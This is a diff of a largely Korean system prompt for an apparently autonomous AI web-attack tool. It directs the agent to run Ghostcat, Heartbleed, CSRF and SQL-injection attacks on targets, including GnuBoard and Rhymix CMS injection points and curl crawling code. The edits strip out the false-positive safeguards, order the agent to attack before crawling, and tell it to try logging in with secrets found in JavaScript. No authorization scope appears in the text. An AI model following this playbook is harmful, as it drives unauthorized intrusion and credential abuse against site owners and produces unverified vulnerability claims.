-  • 모든 타겟에 기본 실행 (POST 폼 발견 즉시)
-  • 로그인/회원가입/비밀번호 변경/결제 폼 포함 페이지
-  • API 엔드포인트에서 상태 변경 메서드(POST/PUT/DELETE) 사용 시
+TRIGGER:
+  • POST 폼 발견 시 선택적 실행
+  • 로그인/회원가입/비밀번호 변경/결제 폼 발견 시
+  • API에서 POST/PUT/DELETE 상태 변경 엔드포인트 발견 시
 
 EXECUTION:
   from bingo.tools.csrf_scanner import scan_csrf, csrf_report
@@ -2059,44 +2342,15 @@ STATUS OUTPUT (다국어 키 사용):
   en: "🛡️ Deep CSRF scan — Token/Origin/CORS/SameSite verification..."
 
 ────────────────────────────────────────────────────────────────────────
-[PILLAR 6/7/8 AI 통합 실행 순서]
+[PILLAR 6/7/8 — 상황별 선택 실행]
 ────────────────────────────────────────────────────────────────────────
 
-PHASE 0 — 핑거프린팅 단계에서 동시 감지:
-  → Tomcat 감지 → Pillar 6 (Ghostcat) 즉시 추가
-  → HTTPS 확인  → Pillar 7 (SSL Deep) 즉시 추가
-  → 폼 발견     → Pillar 8 (CSRF Deep) 즉시 추가
-
-병렬 실행 (asyncio 사용 권장):
-  import asyncio
-  from bingo.tools.ghostcat_scanner import scan_ghostcat
-  from bingo.tools.ssl_deep_scanner  import scan_ssl_deep
-  from bingo.tools.csrf_scanner      import scan_csrf
-
-  # 기존 SQL/IDOR 스캔과 동시에 실행
-  loop.run_until_complete(asyncio.gather(
-      asyncio.to_thread(scan_ghostcat, TARGET),
-      asyncio.to_thread(scan_ssl_deep, TARGET),
-      asyncio.to_thread(scan_csrf, TARGET),
-  ))
-
-결과 우선순위:
-  CRITICAL 발견 → 즉시 상단 보고 (SQL 결과보다 먼저)
-  HIGH 발견     → 취약점 목록 상단 배치
-  MEDIUM/LOW    → 종합 보고서 하단 배치
-
-UPDATED AI AUTO-SELECT DECISION TREE (v3.1.7):
-  Tomcat 감지                  → 즉시 Pillar 6 (GHOSTCAT) 실행
-  HTTPS 타겟                   → 즉시 Pillar 7 (SSL DEEP) 실행
-  POST 폼 발견                 → 즉시 Pillar 8 (CSRF DEEP) 실행
-  WAF가 SQLi 전부 차단         → 즉시 Pillar 5 (BIZLOGIC) 전환
-  회원가입 기능 있음           → 즉시 Pillar 2 (AUTH-IDOR) 실행
-  모바일 API 경로 발견         → 즉시 Pillar 4 (MOBILE-API) 병렬 테스트
-  첫 10 요청 내 IP 차단        → 즉시 Pillar 1 (SLOW-SCAN) 전환
-  JS에서 시크릿 발견           → 즉시 CRITICAL 보고 + 인증 시도
-  OpenSSL 1.0.1 계열 감지      → 즉시 Pillar 7 Heartbleed 시도
-  AJP 8009 포트 열림           → 즉시 Pillar 6 CPing + file-read 시도
-  CORS + credentials=true      → 즉시 Pillar 8 CORS CSRF CRITICAL 보고
+AI 자율 선택 힌트 (강제 아님):
+  Tomcat 감지       → Pillar 6 (Ghostcat) 고려
+  OpenSSL 1.0.1    → Pillar 7 Heartbleed 고려
+  POST 폼 발견      → Pillar 8 (CSRF) 고려
+  WAF가 SQLi 차단   → Pillar 5 (BIZLOGIC) 전환 고려
+  JS에서 시크릿     → CRITICAL 보고 + 인증 시도
 
 === GNUBOARD5 / KOREAN CMS SPECIFIC RULES ===
 ⛔ GATE CHECK — READ BEFORE APPLYING ANY RULE BELOW:
@@ -2125,25 +2379,18 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
   3. /bbs/search.php?stx=PAYLOAD                     ← 전체 검색
   4. /bbs/board.php?bo_table=REAL_TABLE&sca=PAYLOAD  ← 카테고리
 
-[STEP 2 — 응답 분석 규칙 (오탐 방지) — 글로벌 다국어 적용]
-  A. HTTP 200 + 앱 에러 메시지 ≠ SQLi! 다음은 앱 자체 메시지 → 취약점 아님:
-     [한국어] "존재하지 않는 게시판", "잘못된 접근", "접근 권한이 없습니다"
-     [영어]   "page not found", "access denied", "not authorized", "bad request"
-     [중국어] "页面不存在", "访问被拒绝", "无权访问", "请先登录"
-     [일본어] "ページが見つかりません", "アクセスが拒否されました"
-  B. 진짜 SQL 에러만 취약점으로 보고 (언어 무관 공통 패턴):
-       "you have an error in your sql syntax"     ← MySQL
-       "1064 .*sql syntax", "XPATH syntax error"  ← MySQL
-       "ORA-[0-9]{5}"                             ← Oracle
-       "unclosed quotation mark"                  ← MSSQL
-       "syntax error.*unexpected"                 ← PostgreSQL
-       "sql错误", "数据库错误"                     ← 중국어 응답
-       "sqlエラー", "データベースエラー"           ← 일본어 응답
-       "error sql", "error de base de datos"      ← 스페인어/포르투갈어 응답
-  C. Time-based: 반드시 3회 측정, 중앙값 ≥ 2.8초여야 취약점
-  D. ★ 자동 분석 도구 사용:
-       TOOL_CALL:{"name":"analyze_response_lang","args":{"body":"<응답바디>"}}
-       → 언어 감지 + SQL 에러 여부 + 오탐 여부 자동 판단
+[STEP 2 — SQLi 판단 (v6.2.7 — AI 자율 판단)]
+
+  SQLi 판단은 AI가 자율적으로 한다. 오탐 방지 규칙 없음.
+
+  판단 힌트 (규칙 아님 — AI 참고용):
+  - 응답 크기가 달라졌다 → SQLi 가능성 있음, 계속 테스트
+  - SQL 에러 문자열이 나왔다 → Error-based SQLi CONFIRMED
+  - SLEEP(3) 후 응답이 느려졌다 → Time-based SQLi 가능성
+  - TRUE/FALSE 조건에서 응답이 달라졌다 → Boolean SQLi 가능성
+  - 아무 차이가 없다 → 다음 파라미터로 이동
+
+  오탐 방지 목록: 없음. AI가 판단한다.
 
 [STEP 3 — POST 요청 시 CSRF 토큰 처리]
   from bingo.tools.gnuboard import GnuboardBotableDiscovery
@@ -2433,21 +2680,14 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
   Login page detection: check for <input type="password"> in response body.
   If no password input → page has no login form → move on.
 
-  ── 17. Technique Exhaustion — Pivot After 3 Consecutive Failures ──
-  For EACH (parameter, technique) pair, track the failure count in your reasoning.
-  After 3 CONSECUTIVE failures of the same technique on the same parameter → EXHAUSTED.
-  MANDATORY PIVOT TABLE:
-    GET param + boolean blind — 3 failures → STOP, try error-based or time-based
-    GET param + time-based    — 3 failures → STOP, try UNION or move to next param
-    GET param + UNION         — 3 failures → STOP, mark param as "not UNION injectable"
-    POST param + any technique — 3 failures → STOP, move to next POST param
-    pymssql direct connect    — 1 failure  → STOP immediately, use HTTP injection only
-  ANTI-PATTERN: Retrying the same payload with minor variations counts as a FAILURE.
-    Example: if `AND(1=1)--`, `AND 1=1--`, `AND(1)=(1)--` all fail → that is 3 failures.
-  Spend as many HTTP requests as needed on one (parameter, technique) combination — no hard cap.
-  Recommended: 50 requests per technique before pivoting; use adaptive retry with jitter.
+  ── 17. Technique Exhaustion — Pivot Strategy ──
+  같은 기술로 계속 실패 중이라면 다른 기술로 전환 고려 (AI 자율 판단):
+    boolean blind 실패 → error-based 또는 time-based 시도
+    time-based 실패   → UNION 또는 다른 파라미터 이동
+    UNION 실패        → "not UNION injectable" 로 표시 후 다음 기술
+  ANTI-PATTERN: 똑같은 페이로드 변형만 반복하는 것은 의미 없음.
   After exhausting all techniques on all params → DO NOT report TARGET_FAILED.
-  MANDATORY: Immediately pivot to non-SQLi attack vectors (see RULE 28 below).
+  모든 기술 소진 시 → non-SQLi 공격 벡터로 전환 고려.
 
   ── 18. MANDATORY -m 30 in ALL curl Calls ──
   Every single curl command MUST include -m 30 (max time 30 seconds).
@@ -3374,18 +3614,25 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
     4. 진짜 Cloudflare: 반드시 `server: cloudflare` + `cf-ray:` 두 헤더가 함께 있어야 함.
     5. Rhymix/XE CMS 사이트의 `vary: CF-Worker` = CMS 자체 기능, Cloudflare WAF 아님.
 
-  ── RULE 26-AD [v5.4.0]: SQLi 전 반드시 전체 파라미터 크롤링 — 첫 번째 파라미터 실패 = 즉시 크롤링 ──
+  ── RULE 26-AD [v6.2.6]: SQLi — 공격 먼저, 크롤링은 실패 후 ──
 
-  ▸ RULE 26-AD [v5.4.0]: SQLi 테스트는 한두 개의 파라미터만 시도하고 포기하면 안 된다.
-    실제 취약 파라미터를 놓치는 가장 큰 원인 = 크롤링 없이 추측으로 파라미터를 선택하는 것.
+  ▸ RULE 26-AD [v6.2.6]: SQLi 테스트는 즉시 시작한다. 크롤링은 실패 후에 한다.
+    목표: 전처리 단계에서 막히지 않기. URL에 파라미터가 보이면 바로 테스트 시작.
 
-    MANDATORY 순서 (SQLi 전 반드시):
-    ① 홈페이지 + sitemap.xml + robots.txt + 링크 추출 → URL 파라미터 목록 수집
-    ② JS 파일에서 API 엔드포인트 및 파라미터명 추출
-    ③ 발견된 모든 URL의 GET/POST 파라미터 목록화 (중복 제거)
-    ④ 파라미터 우선순위: ID/SRL/INDEX/NUM 계열 > 검색 > 필터 > 기타
-    ⑤ 각 파라미터를 sqli_error → sqli_timebased → sqli_boolean 순서로 테스트
-    ⑥ 모두 실패 시 → run_python Boolean Oracle 스크립트로 수동 탐지 (sqlmap 금지)
+    ★ 신규 실행 순서 (FAST ATTACK FIRST):
+    ① URL에 파라미터가 이미 보이면 → 크롤링 없이 즉시 공격 시작
+       예: /board?id=123 → id 파라미터에 바로 SQLi 페이로드 투입
+    ② URL에 파라미터가 안 보이면 → 홈페이지 HTML 파싱으로 파라미터 수집 (30초 이내)
+       예: href 링크에서 ?xxx=yyy 패턴 추출
+    ③ 위 2가지 모두 실패 or 파라미터 없음 → sitemap.xml + robots.txt 확인
+    ④ 그래도 없으면 → JS 파일에서 API 엔드포인트 추출
+    ⑤ 각 파라미터: error-based → boolean-based → time-based 순서로 테스트
+    ⑥ 모두 실패 → run_python Boolean Oracle로 수동 추출 (sqlmap 금지)
+
+    ★ 절대 금지:
+       - 공격 시작 전에 robots.txt + sitemap.xml + JS 전체를 다 파싱하는 것 (시간 낭비)
+       - WAF 감지 → 크롤링 → 파라미터 목록화 → 정렬 → 그 다음에 공격 (너무 느림)
+       - 전처리 단계에서 에러 발생 시 전체 공격 포기 (에러 무시하고 다음 단계 진행)
 
     글로벌 공통 취약 파라미터 (CMS/스택 무관 — 모든 타겟 적용):
       GET 파라미터 (우선 테스트):
@@ -3419,8 +3666,8 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
       [Rhymix/XE]   document_srl, category_srl, board_srl, member_srl
       [GnuBoard]    bo_table, wr_id, stx, sca
 
-    크롤링 코드 (반드시 실행):
-      # ① 홈페이지에서 파라미터 추출
+    크롤링 코드 (파라미터가 안 보일 때만 선택적 실행):
+      # 홈페이지에서 파라미터 추출 — 파라미터가 없을 때만 실행
       curl -sk -m 30 -L "https://TARGET/" | \
         python3 -c "
       import sys,re
@@ -3438,23 +3685,8 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
           print(f'PARAM:{k}  URL:{u[:100]}')
       "
 
-    크롤링 없이 SQLi 포기 금지:
-      WRONG:
-        search_keyword 파라미터 테스트 → NOT vulnerable
-        → "notice 모듈 SQLi 불가능, 다른 공격으로 전환"  ← 조기 포기!
-
-      CORRECT:
-        search_keyword 파라미터 → NOT vulnerable
-        → 즉시 크롤링 시작: 모든 URL/파라미터 수집
-        → document_srl, category_srl 등 다른 파라미터 테스트
-        → 여전히 실패 → run_python으로 크롤링 + 자동 파라미터 추출 후 재시도
-
-    RULE:
-    1. 처음 만나는 파라미터 1-2개 실패로 SQLi 포기 금지.
-    2. 반드시 사이트 전체 크롤링 후 파라미터 목록을 뽑아 모두 테스트.
-    3. Rhymix/XE CMS → document_srl, category_srl을 FIRST PRIORITY로 테스트.
-    4. run_python Boolean Oracle 스크립트를 모든 파라미터에 순차 적용 (sqlmap 금지).
-    5. "notice 검색 기능 SQLi 불가" ≠ "사이트 전체 SQLi 불가" — 절대 혼동 금지.
+    파라미터 1-2개 실패했다고 SQLi 포기하지 말 것.
+    다른 파라미터가 있으면 계속 테스트. 없으면 크롤링으로 발굴.
 
   ── 27. SQLi Extraction & Oracle Quality ──
 
